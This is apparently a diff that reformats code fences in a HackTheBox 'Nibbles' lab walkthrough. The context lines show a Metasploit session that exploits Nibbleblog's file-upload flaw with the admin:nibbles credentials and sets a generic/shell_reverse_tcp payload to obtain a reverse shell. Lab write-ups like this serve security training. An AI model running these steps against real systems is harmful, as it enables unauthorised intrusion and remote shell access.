@@ -4,8 +4,7 @@
 
 As discussed earlier, there is also a `Metasploit` module that works for this box. It is considerably more straightforward, but it is worth practicing both methods to become familiar with as many tools and techniques as possible. Start `Metasploit` from your attack box by typing `msfconsole`. Once loaded, we can search for the exploit.
 
-```
-        shellsession
+```shellsession
 msf6 > search nibbleblog
 
 Matching Modules
@@ -22,8 +21,7 @@ Interact with a module by name or index. For example info 0, use 0 or use exploi
 
 We can then type `use 0` to load the selected exploit. Set the `rhosts` option as the target IP address and `lhost` as the IP address of your `tun0` adapter (the one that comes with the VPN connection to HackTheBox).
 
-```
-        shellsession
+```shellsession
 msf6 > use 0
 [*] No payload configured, defaulting to php/meterpreter/reverse_tcp
 
@@ -35,8 +33,7 @@ lhost => 10.10.14.2
 
 Type show options to see what other options need to be set.
 
-```
-        shellsession
+```shellsession
 msf6 exploit(multi/http/nibbleblog_file_upload) > show options 
 
 Module options (exploit/multi/http/nibbleblog_file_upload):
@@ -68,8 +65,7 @@ Exploit target:
 
 We need to set the admin username and password `admin:nibbles` and the `TARGETURI` to `nibbleblog`.
 
-```
-        shellsession
+```shellsession
 msf6 exploit(multi/http/nibbleblog_file_upload) > set username admin
 username => admin
 msf6 exploit(multi/http/nibbleblog_file_upload) > set password nibbles
@@ -80,8 +76,7 @@ targeturi => nibbleblog
 
 We also need to change the payload type. For our purposes let's go with `generic/shell_reverse_tcp`. We put these options and then type `exploit` and receive a reverse shell.
 
-```
-        shellsession
+```shellsession
 msf6 exploit(multi/http/nibbleblog_file_upload) > set payload generic/shell_reverse_tcp
 payload => generic/shell_reverse_tcp
 msf6 exploit(multi/http/nibbleblog_file_upload) > show options 
